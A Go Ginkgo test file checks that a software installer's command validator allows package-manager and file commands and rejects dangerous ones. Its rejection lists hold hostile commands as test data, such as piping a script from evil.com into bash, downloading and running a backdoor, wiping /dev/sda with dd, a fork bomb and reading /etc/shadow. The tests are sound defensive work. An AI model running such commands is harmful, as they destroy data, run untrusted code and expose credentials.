package tui

import (
	"context"

	tea "github.com/charmbracelet/bubbletea"
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/jameswlane/devex/pkg/types"
)

var _ = Describe("Command Validation", func() {
	var installer *StreamingInstaller

	BeforeEach(func() {
		installer = createTestInstaller(GinkgoT())
	})

	Describe("Allowed Commands", func() {
		It("should allow valid commands", func() {
			allowedCommands := []string{
				"apt update",
				"apt-get install vim",
				"dpkg -i package.deb",
				"curl -fsSL https://example.com",
				"wget https://example.com/file.tar.gz",
				"git clone https://github.com/user/repo.git",
				"docker run hello-world",
				"npm install",
				"pip install requests",
				"pip3 install --user package",
				"go build ./cmd/main.go",
				"cargo build --release",
				"flatpak install org.example.App",
				"snap install code",
				"dnf install vim",
				"yum update",
				"pacman -S vim",
				"zypper install git",
				"brew install node",
				"mise install node@20",
				"mkdir -p /opt/app",
				"cp file.txt /tmp/",
				"mv old.txt new.txt",
				"chmod +x script.sh",
				"chown user:group file.txt",
				"ln -s /usr/bin/node /usr/local/bin/node",
				"tar -xzf archive.tar.gz",
				"unzip file.zip",
				"gunzip file.gz",
				"echo 'Hello World'",
				"cat /etc/os-release",
				"which node",
				"whereis python",
				"id",
				"whoami",
			}

			for _, cmd := range allowedCommands {
				By("validating command: "+cmd, func() {
					err := installer.executor.ValidateCommand(cmd)
					Expect(err).ToNot(HaveOccurred(), "Command should be allowed: %s", cmd)
				})
			}
		})
	})

	Describe("Sudo Commands", func() {
		It("should allow valid sudo commands", func() {
			validSudoCommands := []string{
				"sudo apt update",
				"sudo apt-get install vim",
				"sudo dpkg -i package.deb",
				"sudo mkdir -p /opt/app",
				"sudo chmod +x /usr/local/bin/script",
				"sudo chown root:root /etc/config",
			}

			for _, cmd := range validSudoCommands {
				By("validating sudo command: "+cmd, func() {
					err := installer.executor.ValidateCommand(cmd)
					Expect(err).ToNot(HaveOccurred(), "Sudo command should be allowed: %s", cmd)
				})
			}
		})
	})

	Describe("Disallowed Commands", func() {
		It("should reject dangerous commands", func() {
			disallowedCommands := []string{
				"rm -rf /",
				"sh -c 'malicious code'",
				"bash -c 'evil script'",
				"python -c 'import os; os.system(\"rm -rf /\")'",
				"perl -e 'malicious code'",
				"ruby -e 'dangerous code'",
				"nc -l 1234",
				"telnet malicious.com",
				"ssh user@malicious.com",
				"sudo malicious_command",
				"unknown_command arg1 arg2",
			}

			for _, cmd := range disallowedCommands {
				By("rejecting dangerous command: "+cmd, func() {
					err := installer.executor.ValidateCommand(cmd)
					Expect(err).To(HaveOccurred(), "Command should be rejected: %s", cmd)
				})
			}
		})
	})

	Describe("Command Injection Attempts", func() {
		It("should block command injection attempts", func() {
			injectionAttempts := []string{
				// Command separators
				"apt update; rm -rf /",
				"apt update & malicious_command",
				"apt update | malicious_pipe",

				// Logical operators
				"apt update && rm -rf /",
				"apt update || malicious_fallback",

				// Command substitution
				"echo `rm -rf /`",
				"echo $(malicious_command)",
				"echo ${malicious_var}",

				// Directory traversal
				"cat ../../../etc/passwd",
				"cp file ../../etc/malicious",

				// Sensitive file access
				"cat /etc/passwd",
				"cat /etc/shadow",
				"grep user /etc/passwd",

				// Dangerous operations
				"rm -rf /home",
				"rm -rf /var",
				"rm -rf /usr",
				"dd if=/dev/zero of=/dev/sda",
				"dd if=/dev/urandom of=/dev/sda",

				// Fork bombs
				":(){ :|:& };:",

				// Writing to system directories
				"echo malicious > /etc/hosts",
				"echo evil > /dev/sda1", // Changed to a dangerous device
				"cat malicious > /etc/passwd",

				// Complex injection attempts
				"apt update; curl http://evil.com/script | bash",
				"npm install; wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh",
				"pip install requests && python -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])'",
			}

			for _, cmd := range injectionAttempts {
				By("blocking injection attempt: "+cmd, func() {
					err := installer.executor.ValidateCommand(cmd)
					Expect(err).To(HaveOccurred(), "Injection attempt should be blocked: %s", cmd)
				})
			}
		})
	})

	// TODO: Convert remaining test functions to Ginkgo format
	// - TestValidateCommand_EdgeCases
	// - TestValidateCommand_CaseSensitivity
	// - TestValidateCommand_SpecialCharacters
})

// Helper functions
func createTestInstaller(t GinkgoTInterface) *StreamingInstaller {
	// Create a minimal tea program for testing
	program := tea.NewProgram(nil)

	// Create mock repository
	mockRepo := &struct{ types.Repository }{} // Empty mock for validation tests

	// Create context
	ctx := context.Background()

	return NewStreamingInstaller(program, mockRepo, ctx)
}
